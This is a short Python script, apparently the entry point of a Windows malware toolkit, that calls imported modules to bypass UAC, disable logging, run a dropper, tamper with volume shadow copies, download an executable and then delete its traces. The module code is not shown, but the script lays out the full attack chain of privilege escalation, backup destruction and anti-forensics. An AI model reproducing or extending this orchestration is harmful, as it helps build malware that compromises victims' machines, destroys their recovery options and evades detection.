import Dropper
import delete_trace
import bypass_uac
import download_exe
import disable_logs
import vss
#import deletefile

def main():
    if bypass_uac.main() and disable_logs.main() and Dropper.main() and vss.main():
        if download_exe.main():    
            print("Marche")
            delete_trace.main()
            input_ = input("Appuyer sur Enter ...")
        
    else:
        delete_trace.main()

main()
